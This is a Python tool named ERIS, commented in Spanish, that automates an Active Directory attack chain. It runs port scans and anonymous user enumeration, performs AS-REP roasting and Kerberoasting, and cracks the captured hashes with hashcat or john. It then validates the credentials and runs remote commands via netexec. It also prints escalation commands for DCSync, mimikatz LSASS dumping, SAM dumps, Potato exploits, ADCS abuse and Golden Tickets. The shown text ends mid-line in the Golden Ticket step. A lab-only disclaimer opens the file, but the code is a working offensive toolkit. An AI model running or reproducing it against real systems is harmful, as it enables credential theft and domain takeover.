#!/usr/bin/env python3
"""
ERIS — AD Attack Chain Automation
Basado en OCD Active Directory Attack Mindmap 2025
Solo para entornos controlados: HTB, THM, VulnHub, labs propios.
"""

import json
import sys
import os
import re
import subprocess
import shutil
import argparse
import time
from dataclasses import dataclass, field, asdict
from typing import Optional
from enum import Enum
from pathlib import Path

# ─── COLORES ────────────────────────────────────────────────────────────────
R      = "\033[0m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
MAGENTA= "\033[95m"
GRAY   = "\033[90m"

BANNER = f"""{BOLD}{RED}
  ███████╗██████╗ ██╗███████╗
  ██╔════╝██╔══██╗██║██╔════╝
  █████╗  ██████╔╝██║███████╗
  ██╔══╝  ██╔══██╗██║╚════██║
  ███████╗██║  ██║██║███████║
  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝{R}
{BOLD}{GRAY}  AD Attack Chain  ·  OCD Mindmap 2025
  Solo entornos controlados: HTB · THM · VulnHub{R}
"""

# ─── LOGGING ────────────────────────────────────────────────────────────────
def log_phase(name: str) -> None:
    print(f"\n{BOLD}{MAGENTA}{'═'*62}\n  ⚔  {name}\n{'═'*62}{R}")

def log_step(msg: str) -> None:
    print(f"\n{BOLD}{CYAN}[*]{R} {msg}")

def log_ok(msg: str) -> None:
    print(f"{GREEN}[+]{R} {msg}")

def log_warn(msg: str) -> None:
    print(f"{YELLOW}[!]{R} {msg}")

def log_err(msg: str) -> None:
    print(f"{RED}[-]{R} {msg}")

def log_info(msg: str) -> None:
    print(f"{GRAY}    {msg}{R}")

def log_cmd(cmd: str) -> None:
    print(f"{DIM}    $ {cmd}{R}")

# ─── ESTADO COMPARTIDO ──────────────────────────────────────────────────────
@dataclass
class ErisContext:
    target_ip:    str  = ""
    domain:       str  = ""
    dc_ip:        str  = ""
    output_dir:   str  = "eris_output"

    # Red
    open_ports:   list = field(default_factory=list)
    smb_signing:  bool = True

    # Usuarios
    users:        list = field(default_factory=list)

    # Hashes
    hashes_asrep: dict = field(default_factory=dict)   # user -> hash
    hashes_kerb:  dict = field(default_factory=dict)   # user -> hash
    hashes_ntlm:  dict = field(default_factory=dict)   # user -> NThash

    # Credenciales crackeadas
    cracked:      dict = field(default_factory=dict)   # user -> password

    # Acceso validado
    valid_smb:    list = field(default_factory=list)   # [(user, pass)]
    valid_winrm:  list = field(default_factory=list)   # [(user, pass)]
    admin_smb:    list = field(default_factory=list)   # [(user, pass)] Pwn3d!

    # Post-explotación
    current_user:  str  = ""
    current_groups: list = field(default_factory=list)
    privileges:    list = field(default_factory=list)
    net_groups:    dict = field(default_factory=dict)  # group -> [members]

    # Control de flujo
    phase_done:   list = field(default_factory=list)

    @property
    def domain_dn(self) -> str:
        return ",DC=".join(self.domain.split("."))

    def best_creds(self) -> Optional[tuple]:
        """Retorna las mejores credenciales disponibles."""
        if self.admin_smb:
            return self.admin_smb[0]
        if self.valid_winrm:
            return self.valid_winrm[0]
        if self.valid_smb:
            return self.valid_smb[0]
        if self.cracked:
            u = list(self.cracked.keys())[0]
            return (u, self.cracked[u])
        return None

    def save(self) -> None:
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        with open(f"{self.output_dir}/eris_state.json", "w") as f:
            json.dump(asdict(self), f, indent=2, ensure_ascii=False)

    @classmethod
    def load(cls, path: str) -> "ErisContext":
        with open(path) as f:
            data = json.load(f)
        ctx = cls()
        for k, v in data.items():
            if hasattr(ctx, k):
                setattr(ctx, k, v)
        return ctx


# ─── EJECUTOR DE COMANDOS ────────────────────────────────────────────────────
class Runner:
    def __init__(self, ctx: ErisContext):
        self.ctx = ctx
        Path(ctx.output_dir).mkdir(parents=True, exist_ok=True)

    def run(self, cmd: str, timeout: int = 120) -> tuple[str, str, int]:
        log_cmd(cmd)
        try:
            r = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=timeout,
                env={**os.environ}
            )
            return r.stdout, r.stderr, r.returncode
        except subprocess.TimeoutExpired:
            log_warn(f"Timeout ({timeout}s) — comando cancelado")
            return "", "TIMEOUT", -1
        except Exception as e:
            return "", str(e), -1

    def available(self, tool: str) -> bool:
        return shutil.which(tool) is not None

    def save(self, name: str, content: str) -> str:
        path = f"{self.ctx.output_dir}/{name}"
        with open(path, "w") as f:
            f.write(content)
        return path

    def exec_remote(self, command: str, user: str, password: str) -> str:
        """Ejecuta comando remoto vía WinRM o SMB según disponibilidad."""
        ctx = self.ctx
        if (user, password) in ctx.valid_winrm:
            proto = "winrm"
        else:
            proto = "smb"
        cmd = f"netexec {proto} {ctx.target_ip} -u '{user}' -p '{password}' -d {ctx.domain} -x '{command}' 2>/dev/null"
        out, _, _ = self.run(cmd, timeout=30)
        # Extraer solo el output del comando (quitar prefijo netexec)
        lines = []
        for line in out.splitlines():
            m = re.search(r'(?:WINRM|SMB)\s+\S+\s+\d+\s+\S+\s+(.*)', line)
            if m:
                content = m.group(1).strip()
                if content and not content.startswith("["):
                    lines.append(content)
        return "\n".join(lines) if lines else out


# ─── PARSERS ─────────────────────────────────────────────────────────────────
def parse_rid_users(output: str) -> list[str]:
    users = []
    for line in output.splitlines():
        m = re.search(r'SidTypeUser.*?\\(\w[\w.-]+)', line)
        if m:
            u = m.group(1)
            if u.lower() not in ("guest", "krbtgt") and not u.endswith("$"):
                users.append(u)
    return list(set(users))

def parse_netexec_users(output: str) -> list[str]:
    users = []
    for line in output.splitlines():
        m = re.search(r'\\\s*([\w][\w.-]+)\s', line)
        if m:
            u = m.group(1)
            if u.lower() not in ("guest", "krbtgt") and not u.endswith("$"):
                users.append(u)
    return list(set(users))

def parse_cred_result(output: str) -> dict:
    valid, admin = [], []
    for line in output.splitlines():
        if "[+]" in line:
            m = re.search(r"-u\s+'?(\S+?)'?\s+-p\s+'?(.+?)'?\s", line) or \
                re.search(r"(\S+):(\S+)\s", line)
            if m:
                valid.append((m.group(1), m.group(2)))
            if "Pwn3d!" in line:
                if m:
                    admin.append((m.group(1), m.group(2)))
    return {"valid": valid, "admin": admin}

def parse_asrep_user(hash_line: str) -> str:
    m = re.search(r'\$krb5asrep\$\d*\$?([^@$]+)[@$]', hash_line)
    return m.group(1).lower() if m else "unknown"

def parse_kerb_user(hash_line: str) -> str:
    m = re.search(r'\$krb5tgs\$\d+\$\*([^*]+)\*', hash_line)
    return m.group(1).lower() if m else "unknown"

def parse_cracked_hashcat(pot_file: str, hash_file: str) -> dict:
    """Lee hashcat potfile y mapea hashes a contraseñas."""
    cracked = {}
    if not Path(pot_file).exists():
        return cracked
    pot = Path(pot_file).read_text()
    hashes_raw = Path(hash_file).read_text().splitlines() if Path(hash_file).exists() else []
    for line in pot.splitlines():
        if ":" not in line:
            continue
        idx = line.rfind(":")
        h_fragment = line[:idx]
        password = line[idx+1:]
        for full_hash in hashes_raw:
            if h_fragment in full_hash:
                user = parse_asrep_user(full_hash) or parse_kerb_user(full_hash)
                cracked[user] = password
    return cracked

def parse_john_cracked(output: str) -> dict:
    cracked = {}
    for line in output.splitlines():
        m = re.match(r'^(\S+)\s+\((.+?)\)', line)
        if m:
            cracked[m.group(2).lower()] = m.group(1)
    return cracked

def parse_whoami_all(output: str) -> dict:
    result = {"user": "", "groups": [], "privileges": []}

    # Usuario
    for line in output.splitlines():
        m = re.match(r'\s*(\S+\\\S+)\s*$', line)
        if m and "\\" in m.group(1) and not m.group(1).startswith("\\"):
            result["user"] = m.group(1)
            break

    # Grupos
    in_groups = False
    for line in output.splitlines():
        if re.search(r'group information', line, re.I):
            in_groups = True
            continue
        if in_groups:
            if re.search(r'privilege information', line, re.I):
                break
            line = line.strip()
            if line and not re.match(r'^[-=\s]+$', line) and \
               not re.match(r'^(Group Name|Type|SID|Attributes)', line, re.I):
                # Tomar solo la primera columna (nombre del grupo)
                parts = re.split(r'\s{2,}', line)
                if parts and len(parts[0]) > 2:
                    result["groups"].append(parts[0].strip())

    # Privilegios
    priv_list = [
        "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
        "SeBackupPrivilege", "SeRestorePrivilege", "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege", "SeDebugPrivilege", "SeManageVolumePrivilege",
        "SeTcbPrivilege", "SeCreateTokenPrivilege",
    ]
    for priv in priv_list:
        if priv in output:
            result["privileges"].append(priv)

    return result

def parse_net_group_members(output: str) -> list[str]:
    members = []
    capture = False
    for line in output.splitlines():
        if re.search(r'members|miembros', line, re.I):
            capture = True
            continue
        if capture:
            line = line.strip()
            if not line or re.match(r'^[-]+$', line):
                continue
            if re.search(r'command completed|successfully', line, re.I):
                break
            parts = line.split()
            members.extend(p.strip() for p in parts if p.strip())
    return members


# ─── MAPA PRIVILEGIOS / GRUPOS → ATAQUES ────────────────────────────────────
PRIV_ATTACKS = {
    "SeImpersonatePrivilege": [
        ("PrintSpoofer",  "PrintSpoofer64.exe -i -c cmd"),
        ("GodPotato",     "GodPotato.exe -cmd 'cmd /c whoami'"),
        ("JuicyPotatoNG", "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami'"),
    ],
    "SeAssignPrimaryTokenPrivilege": [
        ("PrintSpoofer",  "PrintSpoofer64.exe -i -c cmd"),
        ("RoguePotato",   "RoguePotato.exe -r <attacker_ip> -e 'cmd.exe'"),
    ],
    "SeBackupPrivilege": [
        ("SAM/SYSTEM dump", "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak"),
        ("Diskshadow",      "diskshadow /s script.txt  → copia VSS de NTDS.dit"),
    ],
    "SeRestorePrivilege": [
        ("DLL hijack",  "Reemplazar DLL de servicio privilegiado con payload"),
    ],
    "SeLoadDriverPrivilege": [
        ("Capcom exploit", "eoploaddriver.exe + exploit kernel"),
    ],
    "SeDebugPrivilege": [
        ("LSASS dump",  "procdump.exe -ma lsass.exe lsass.dmp"),
        ("mimikatz",    "mimikatz.exe \"sekurlsa::logonpasswords\" exit"),
    ],
    "SeTakeOwnershipPrivilege": [
        ("Tomar propiedad", "takeown /f C:\\ruta\\objetivo /a && icacls ... /grant Everyone:F"),
    ],
    "SeManageVolumePrivilege": [
        ("Arbitrary file write", "Escritura directa en volumen → reemplazar binario privilegiado"),
    ],
}

GROUP_ATTACKS = {
    "domain admins":        ("CRÍTICO", "¡Domain Admin!",             "impacket-secretsdump (DCSync)"),
    "enterprise admins":    ("CRÍTICO", "Enterprise Admin",           "Control total del bosque AD"),
    "backup operators":     ("ALTO",    "Backup Operators",           "SeBackupPrivilege → dump SAM/NTDS.dit"),
    "server operators":     ("ALTO",    "Server Operators",           "Modificar servicios del sistema → SYSTEM"),
    "print operators":      ("ALTO",    "Print Operators",            "SeLoadDriverPrivilege → kernel driver"),
    "dnsadmins":            ("ALTO",    "DnsAdmins",                  "DNS plugin DLL → SYSTEM en DC"),
    "account operators":    ("MEDIO",   "Account Operators",          "Crear/modificar usuarios en AD"),
    "remote management users": ("MEDIO","Remote Management Users",   "WinRM access confirmado"),
    "schema admins":        ("ALTO",    "Schema Admins",              "Modificar schema AD"),
    "administrators":       ("CRÍTICO", "Administradores locales",    "mimikatz / SAM dump"),
    "builtin\\administrators": ("CRÍTICO", "Admin local",             "mimikatz / SAM dump"),
}


# ─── CADENA DE ATAQUE ────────────────────────────────────────────────────────
class ErisChain:
    def __init__(self, ctx: ErisContext, runner: Runner):
        self.ctx = ctx
        self.r   = runner

    # ── FASE 1: RECONOCIMIENTO ─────────────────────────────────────────────
    def phase_recon(self) -> None:
        ctx = self.ctx
        log_phase("FASE 1 — RECONOCIMIENTO")

        log_step("Escaneando puertos AD estándar...")
        ports = "21,22,25,53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986"
        out, _, _ = self.r.run(
            f"nmap -p {ports} --open -T3 -sV {ctx.target_ip} -oN {ctx.output_dir}/nmap.txt",
            timeout=240
        )
        self.r.save("nmap_raw.txt", out)

        for p in ["21","22","25","53","80","88","135","139","389","443","445",
                  "464","593","636","1433","3268","3269","3389","5985","5986"]:
            if f"{p}/tcp" in out and "open" in out:
                ctx.open_ports.append(int(p))

        log_ok(f"Puertos abiertos: {ctx.open_ports}")

        if 445 in ctx.open_ports:
            log_step("Verificando SMB Signing...")
            out2, _, _ = self.r.run(f"netexec smb {ctx.target_ip} 2>/dev/null")
            ctx.smb_signing = "signing:False" not in out2 and "signing: False" not in out2
            if not ctx.smb_signing:
                log_warn("SMB Signing DESHABILITADO → NTLM Relay posible")
                log_info(f"  netexec smb {ctx.target_ip}/24 --gen-relay-list {ctx.output_dir}/relay_targets.txt")
            else:
                log_info("SMB Signing habilitado")

        ctx.phase_done.append("recon")
        ctx.save()

    # ── FASE 2: ENUMERACIÓN DE USUARIOS ───────────────────────────────────
    def phase_enum_users(self) -> None:
        ctx = self.ctx
        log_phase("FASE 2 — ENUMERACIÓN DE USUARIOS")

        users_found: list[str] = []

        # RID brute anónimo
        log_step("RID brute force (anónimo)...")
        out, _, _ = self.r.run(
            f"netexec smb {ctx.dc_ip} -u '' -p '' --rid-brute 2>/dev/null",
            timeout=90
        )
        users_found += parse_rid_users(out)

        # LDAP anónimo si RID falla
        if not users_found and 389 in ctx.open_ports:
            log_step("LDAP anónimo...")
            out2, _, _ = self.r.run(
                f"netexec ldap {ctx.dc_ip} -u '' -p '' --users 2>/dev/null",
                timeout=60
            )
            users_found += parse_netexec_users(out2)

        # Si tenemos creds, enumeración autenticada
        creds = ctx.best_creds()
        if not users_found and creds:
            u, p = creds
            log_step(f"Enumeración autenticada como {u}...")
            out3, _, _ = self.r.run(
                f"netexec smb {ctx.dc_ip} -u '{u}' -p '{p}' -d {ctx.domain} --users 2>/dev/null",
                timeout=60
            )
            users_found += parse_netexec_users(out3)

        if users_found:
            ctx.users = list(set(users_found))
            ufile = self.r.save("users.txt", "\n".join(ctx.users))
            log_ok(f"{len(ctx.users)} usuarios → {ufile}")
            log_info(f"  {ctx.users[:8]}{'...' if len(ctx.users) > 8 else ''}")
        else:
            log_warn("Sin usuarios encontrados. Usa --users <archivo> para proveer lista.")

        ctx.phase_done.append("enum_users")
        ctx.save()

    # ── FASE 3: AS-REP ROASTING ────────────────────────────────────────────
    def phase_asrep(self) -> None:
        ctx = self.ctx
        if not ctx.users:
            log_warn("Sin usuarios — saltando AS-REP Roasting")
            return

        log_phase("FASE 3 — AS-REP ROASTING")
        ufile    = f"{ctx.output_dir}/users.txt"
        hashfile = f"{ctx.output_dir}/asrep_hashes.txt"

        log_step("Buscando cuentas sin pre-autenticación Kerberos...")
        out, _, _ = self.r.run(
            f"impacket-GetNPUsers {ctx.domain}/ -dc-ip {ctx.dc_ip} "
            f"-no-pass -usersfile {ufile} -format hashcat -outputfile {hashfile}",
            timeout=90
        )

        if Path(hashfile).exists():
            raw = Path(hashfile).read_text().strip()
            for line in raw.splitlines():
                if line.startswith("$krb5asrep"):
                    user = parse_asrep_user(line)
                    ctx.hashes_asrep[user] = line
                    log_ok(f"AS-REP hash: {user}")

        if not ctx.hashes_asrep:
            log_info("Sin cuentas AS-REP Roastables")

        ctx.phase_done.append("asrep")
        ctx.save()

    # ── FASE 4: KERBEROASTING (con credenciales) ───────────────────────────
    def phase_kerberoast(self) -> None:
        ctx = self.ctx
        creds = ctx.best_creds()
        if not creds:
            log_warn("Sin credenciales — saltando Kerberoasting")
            return

        log_phase("FASE 4 — KERBEROASTING")
        u, p = creds
        hashfile = f"{ctx.output_dir}/kerb_hashes.txt"

        log_step(f"Solicitando TGS para cuentas con SPN ({u})...")
        out, _, _ = self.r.run(
            f"impacket-GetUserSPNs {ctx.domain}/{u}:'{p}' -dc-ip {ctx.dc_ip} "
            f"-request -outputfile {hashfile}",
            timeout=60
        )

        if Path(hashfile).exists():
            for line in Path(hashfile).read_text().splitlines():
                if line.startswith("$krb5tgs"):
                    user = parse_kerb_user(line)
                    ctx.hashes_kerb[user] = line
                    log_ok(f"Kerberoast hash: {user}")

        if not ctx.hashes_kerb:
            log_info("Sin cuentas Kerberoastables")

        ctx.phase_done.append("kerberoast")
        ctx.save()

    # ── FASE 5: CRACKING ───────────────────────────────────────────────────
    def phase_crack(self) -> None:
        ctx = self.ctx
        all_hashes = {**ctx.hashes_asrep, **ctx.hashes_kerb}
        if not all_hashes:
            log_warn("Sin hashes — saltando cracking")
            return

        log_phase("FASE 5 — CRACKING DE HASHES")

        # Wordlist
        wl_candidates = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/usr/share/wordlists/fasttrack.txt",
            "/opt/wordlists/rockyou.txt",
        ]
        wordlist = next((w for w in wl_candidates if Path(w).exists()), None)
        if not wordlist:
            log_err("Wordlist no encontrada. Instala rockyou.txt en /usr/share/wordlists/")
            return

        cracker = "hashcat" if self.r.available("hashcat") else \
                  ("john" if self.r.available("john") else None)
        if not cracker:
            log_err("Ni hashcat ni john disponibles")
            return

        log_info(f"Cracker: {cracker} | Wordlist: {wordlist}")

        # AS-REP hashes
        if ctx.hashes_asrep:
            hfile = f"{ctx.output_dir}/asrep_hashes.txt"
            pot   = f"{ctx.output_dir}/asrep.pot"
            log_step(f"Crackeando {len(ctx.hashes_asrep)} AS-REP hash(es)...")
            if cracker == "hashcat":
                self.r.run(
                    f"hashcat -m 18200 '{hfile}' '{wordlist}' --force -q "
                    f"--potfile-path '{pot}' 2>/dev/null",
                    timeout=600
                )
                ctx.cracked.update(parse_cracked_hashcat(pot, hfile))
            else:
                self.r.run(f"john '{hfile}' --wordlist='{wordlist}' --format=krb5asrep", timeout=600)
                out2, _, _ = self.r.run(f"john '{hfile}' --show --format=krb5asrep")
                ctx.cracked.update(parse_john_cracked(out2))

        # Kerberoast hashes
        if ctx.hashes_kerb:
            hfile = f"{ctx.output_dir}/kerb_hashes.txt"
            pot   = f"{ctx.output_dir}/kerb.pot"
            log_step(f"Crackeando {len(ctx.hashes_kerb)} Kerberoast hash(es)...")
            if cracker == "hashcat":
                self.r.run(
                    f"hashcat -m 13100 '{hfile}' '{wordlist}' --force -q "
                    f"--potfile-path '{pot}' 2>/dev/null",
                    timeout=600
                )
                ctx.cracked.update(parse_cracked_hashcat(pot, hfile))
            else:
                self.r.run(f"john '{hfile}' --wordlist='{wordlist}' --format=krb5tgs", timeout=600)
                out2, _, _ = self.r.run(f"john '{hfile}' --show --format=krb5tgs")
                ctx.cracked.update(parse_john_cracked(out2))

        if ctx.cracked:
            log_ok(f"¡Crackeadas! {ctx.cracked}")
        else:
            log_warn("Ningún hash crackeado con la wordlist actual")

        ctx.phase_done.append("crack")
        ctx.save()

    # ── FASE 6: VALIDACIÓN DE CREDENCIALES ────────────────────────────────
    def phase_validate(self) -> None:
        ctx = self.ctx
        if not ctx.cracked:
            log_warn("Sin credenciales para validar")
            return

        log_phase("FASE 6 — VALIDACIÓN DE CREDENCIALES")

        for user, password in ctx.cracked.items():
            log_step(f"Validando {user}:{password}")

            # SMB
            out, _, _ = self.r.run(
                f"netexec smb {ctx.target_ip} -u '{user}' -p '{password}' "
                f"-d {ctx.domain} 2>/dev/null"
            )
            if "[+]" in out:
                ctx.valid_smb.append((user, password))
                log_ok(f"SMB ✓  {user}:{password}")
                if "Pwn3d!" in out:
                    ctx.admin_smb.append((user, password))
                    log_ok(f"  → ADMIN SMB (Pwn3d!)")

            # WinRM
            if 5985 in ctx.open_ports or 5986 in ctx.open_ports:
                out2, _, _ = self.r.run(
                    f"netexec winrm {ctx.target_ip} -u '{user}' -p '{password}' "
                    f"-d {ctx.domain} 2>/dev/null"
                )
                if "[+]" in out2:
                    ctx.valid_winrm.append((user, password))
                    log_ok(f"WinRM ✓  {user}:{password}")

        if ctx.valid_winrm:
            u, p = ctx.valid_winrm[0]
            log_ok(f"\n  evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'")

        ctx.phase_done.append("validate")
        ctx.save()

    # ── FASE 7: ENUMERACIÓN POST-ACCESO ───────────────────────────────────
    def phase_post_enum(self) -> None:
        ctx = self.ctx
        creds = ctx.best_creds()
        if not creds:
            log_warn("Sin acceso válido para enumeración post-shell")
            return

        log_phase("FASE 7 — ENUMERACIÓN POST-ACCESO")
        user, password = creds
        log_info(f"Ejecutando comandos como {user} vía netexec")

        # whoami /all
        log_step("whoami /all")
        wa = self.r.exec_remote("whoami /all", user, password)
        self.r.save("whoami_all.txt", wa)
        parsed = parse_whoami_all(wa)
        ctx.current_user  = parsed["user"]
        ctx.current_groups = parsed["groups"]
        ctx.privileges    = parsed["privileges"]

        if ctx.current_user:
            log_ok(f"Usuario: {ctx.current_user}")
        if ctx.privileges:
            log_ok(f"Privilegios: {ctx.privileges}")
        if ctx.current_groups:
            log_info(f"Grupos ({len(ctx.current_groups)}): {ctx.current_groups[:6]}")

        # Grupos de dominio clave
        key_groups = [
            "Domain Admins", "Enterprise Admins", "Schema Admins",
            "Backup Operators", "Server Operators", "DnsAdmins",
            "Account Operators", "Print Operators", "Remote Management Users",
        ]
        for group in key_groups:
            log_step(f"net group \"{group}\" /domain")
            g_out = self.r.exec_remote(f'net group "{group}" /domain', user, password)
            members = parse_net_group_members(g_out)
            if members:
                ctx.net_groups[group] = members
                log_ok(f"  {group}: {members}")
            self.r.save(f"group_{group.replace(' ', '_').lower()}.txt", g_out)

        # Info del usuario actual en el dominio
        log_step(f"net user {user} /domain")
        nu_out = self.r.exec_remote(f"net user {user} /domain", user, password)
        self.r.save("net_user.txt", nu_out)

        # Shares accesibles
        log_step("Enumerando shares SMB...")
        sh_out, _, _ = self.r.run(
            f"netexec smb {ctx.target_ip} -u '{user}' -p '{password}' "
            f"-d {ctx.domain} --shares 2>/dev/null"
        )
        self.r.save("smb_shares.txt", sh_out)
        for line in sh_out.splitlines():
            if "READ" in line or "WRITE" in line:
                log_info(f"  Share: {line.strip()}")

        ctx.phase_done.append("post_enum")
        ctx.save()

    # ── FASE 8: ANÁLISIS Y RUTAS DE ESCALADA ──────────────────────────────
    def phase_analyze(self) -> None:
        ctx = self.ctx
        log_phase("FASE 8 — ANÁLISIS Y RUTAS DE ESCALADA")

        attack_paths: list[tuple] = []  # (severity, vector, command/note)

        # Domain Admin directo
        if "Domain Admins" in ctx.net_groups:
            members = [m.lower() for m in ctx.net_groups["Domain Admins"]]
            short_user = ctx.current_user.split("\\")[-1].lower() if ctx.current_user else ""
            if short_user and short_user in members:
                attack_paths.append(("CRÍTICO", "¡YA ERES DOMAIN ADMIN!", ""))

        # Admin SMB → DCSync inmediato
        if ctx.admin_smb:
            u, p = ctx.admin_smb[0]
            attack_paths.append((
                "CRÍTICO",
                "Admin SMB (Pwn3d!) → DCSync",
                f"impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.target_ip} -just-dc-ntlm"
            ))

        # Análisis de privilegios
        for priv in ctx.privileges:
            if priv in PRIV_ATTACKS:
                for atk_name, atk_cmd in PRIV_ATTACKS[priv]:
                    attack_paths.append(("ALTO", f"{priv} → {atk_name}", atk_cmd))

        # Análisis de grupos actuales del usuario
        for group in ctx.current_groups:
            g_lower = group.lower()
            for key, (sev, label, cmd) in GROUP_ATTACKS.items():
                if key in g_lower:
                    attack_paths.append((sev, f"Grupo: {group} → {label}", cmd))

        # Sugerencias adicionales basadas en el mapa OCD
        creds = ctx.best_creds()
        if creds and not attack_paths:
            u, p = creds
            log_warn("Sin rutas inmediatas. Recomendando BloodHound + enumeración ADCS...")
            attack_paths.append((
                "MEDIO",
                "Enumeración BloodHound (ruta completa al DA)",
                f"bloodhound-python -u {u} -p '{p}' -d {ctx.domain} -dc {ctx.dc_ip} -c All --zip"
            ))
            attack_paths.append((
                "MEDIO",
                "Enumeración ADCS (ESC1-8)",
                f"certipy find -u {u}@{ctx.domain} -p '{p}' -dc-ip {ctx.dc_ip} -vulnerable -stdout"
            ))
            attack_paths.append((
                "MEDIO",
                "Revisión LAPS",
                f"netexec ldap {ctx.dc_ip} -u '{u}' -p '{p}' -d {ctx.domain} -M laps"
            ))

        # Mostrar rutas
        severity_order = {"CRÍTICO": 0, "ALTO": 1, "MEDIO": 2}
        attack_paths.sort(key=lambda x: severity_order.get(x[0], 3))

        for sev, vector, cmd in attack_paths:
            color = RED if sev == "CRÍTICO" else (YELLOW if sev == "ALTO" else CYAN)
            print(f"\n  {BOLD}{color}[{sev}]{R} {vector}")
            if cmd:
                print(f"  {GREEN}  → {cmd}{R}")

        self._print_final_summary(attack_paths)
        ctx.phase_done.append("analyze")
        ctx.save()

    def _print_final_summary(self, paths: list) -> None:
        ctx = self.ctx
        print(f"\n{BOLD}{RED}{'═'*62}{R}")
        print(f"{BOLD}  RESUMEN ERIS{R}")
        print(f"{BOLD}{RED}{'═'*62}{R}\n")
        print(f"  {BOLD}Objetivo:{R}      {ctx.target_ip}  |  {ctx.domain}  |  DC: {ctx.dc_ip}")
        print(f"  {BOLD}Puertos:{R}       {ctx.open_ports}")
        print(f"  {BOLD}SMB Signing:{R}   {'Habilitado' if ctx.smb_signing else YELLOW + 'DESHABILITADO' + R}")
        print(f"  {BOLD}Usuarios:{R}      {len(ctx.users)}")
        print(f"  {BOLD}Hashes ASREP:{R}  {len(ctx.hashes_asrep)}  |  Kerb: {len(ctx.hashes_kerb)}")
        print(f"  {BOLD}Crackeados:{R}    {ctx.cracked}")
        print(f"  {BOLD}WinRM válidos:{R} {ctx.valid_winrm}")
        print(f"  {BOLD}Admin SMB:{R}     {ctx.admin_smb}")
        print(f"  {BOLD}Privilegios:{R}   {ctx.privileges}")
        print(f"  {BOLD}Grupos clave:{R}  {list(ctx.net_groups.keys())}")
        print(f"\n  {BOLD}Output:{R} {ctx.output_dir}/")
        print(f"  {BOLD}Estado:{R} {ctx.output_dir}/eris_state.json")

        if ctx.valid_winrm:
            u, p = ctx.valid_winrm[0]
            print(f"\n{BOLD}{GREEN}  Shell interactiva:{R}")
            print(f"  {GREEN}evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'{R}")

        if ctx.admin_smb:
            u, p = ctx.admin_smb[0]
            print(f"\n{BOLD}{RED}  DCSync (admin confirmado):{R}")
            print(f"  {RED}impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.target_ip} -just-dc-ntlm{R}")

    # ── CADENA COMPLETA ────────────────────────────────────────────────────
    def run_full_chain(self) -> None:
        steps = [
            ("recon",       self.phase_recon),
            ("enum_users",  self.phase_enum_users),
            ("asrep",       self.phase_asrep),
            ("kerberoast",  self.phase_kerberoast),
            ("crack",       self.phase_crack),
            ("validate",    self.phase_validate),
            ("post_enum",   self.phase_post_enum),
        ]
        for name, fn in steps:
            if name not in self.ctx.phase_done:
                fn()
            else:
                log_info(f"Saltando '{name}' (ya completado)")

        self.phase_analyze()


# ─── MODO PLAN (OCD Mindmap sin ejecución) ──────────────────────────────────
class Phase(Enum):
    RECON    = 1
    ENUM     = 2
    EXPLOIT  = 3
    ESCALATE = 4
    PERSIST  = 5

PHASE_COLORS = {
    Phase.RECON: BLUE, Phase.ENUM: CYAN, Phase.EXPLOIT: YELLOW,
    Phase.ESCALATE: RED, Phase.PERSIST: MAGENTA,
}

def run_plan_mode(ctx: ErisContext) -> None:
    """Modo sugerencia: imprime rutas sin ejecutar nada."""
    log_phase("MODO PLAN — OCD Mindmap 2025")
    creds = ctx.best_creds()
    u = list(ctx.cracked.keys())[0] if ctx.cracked else "<user>"
    p = ctx.cracked.get(u, "<pass>")

    plan = []

    # Siempre sugerir recon
    plan.append((Phase.RECON, "LOW", "Reconocimiento SMB/LDAP", [
        f"nmap -p 445,389,5985,88,3389 --open -T3 {ctx.target_ip}",
        f"netexec smb {ctx.target_ip}/24 --gen-relay-list relay.txt",
        f"netexec smb {ctx.dc_ip} -u '' -p '' --rid-brute",
    ]))
    plan.append((Phase.ENUM, "LOW", "AS-REP Roasting", [
        f"impacket-GetNPUsers {ctx.domain}/ -dc-ip {ctx.dc_ip} -no-pass -usersfile users.txt -format hashcat",
        f"hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force",
    ]))
    if creds:
        plan.append((Phase.ENUM, "MEDIUM", "BloodHound + enumeración LDAP", [
            f"bloodhound-python -u {u} -p '{p}' -d {ctx.domain} -dc {ctx.dc_ip} -c All --zip",
            f"netexec smb {ctx.target_ip} -u '{u}' -p '{p}' --shares --users",
        ]))
        plan.append((Phase.EXPLOIT, "LOW", "Kerberoasting", [
            f"impacket-GetUserSPNs {ctx.domain}/{u}:'{p}' -dc-ip {ctx.dc_ip} -request",
            f"hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force",
        ]))
        plan.append((Phase.EXPLOIT, "MEDIUM", "Shell vía WinRM", [
            f"evil-winrm -i {ctx.target_ip} -u {u} -p '{p}'",
        ]))
        plan.append((Phase.ESCALATE, "LOW", "ADCS (ESC1-8)", [
            f"certipy find -u {u}@{ctx.domain} -p '{p}' -dc-ip {ctx.dc_ip} -vulnerable -stdout",
            f"certipy req -u {u}@{ctx.domain} -p '{p}' -ca '<CA>' -template '<TPL>' -upn administrator@{ctx.domain}",
        ]))
        plan.append((Phase.ESCALATE, "MEDIUM", "LAPS / ACL abuse", [
            f"netexec ldap {ctx.dc_ip} -u '{u}' -p '{p}' -M laps",
            f"bloodhound → buscar GenericAll / WriteDACL / ForceChangePassword",
        ]))
    if ctx.admin_smb or "acl_dcsync" in ctx.phase_done:
        plan.append((Phase.ESCALATE, "HIGH", "DCSync", [
            f"impacket-secretsdump {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} -just-dc-ntlm",
        ]))
    plan.append((Phase.PERSIST, "HIGH", "Golden Ticket", [
        f"impacket-lookupsid {ctx.domain}/{u}:'{p}'@{ctx.dc_ip} | grep 'Domain SID'",
